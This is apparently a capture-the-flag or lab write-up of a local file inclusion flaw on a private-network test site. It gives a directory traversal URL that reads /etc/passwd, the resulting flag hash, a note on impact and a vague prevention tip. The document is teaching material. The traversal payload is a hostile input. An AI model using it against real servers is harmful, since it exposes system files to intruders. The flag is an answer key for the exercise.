# 03_Include

Unsecure file stored in the website.

## Method

We can use the page include to do transversal directoring,
to go back to / etc / passwd
Go to <http://192.168.1.102/?page=../../../../../../../etc/passwd>
To get the flag:    b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

## Manipulation

An attacker might be able to write to arbitrary files on the server,
allowing them to modify application data or behavior, and ultimately take full control of the server.

## Prevension

Protect your important files in the back-end, or use a secure database instead of storing it in the front-end.
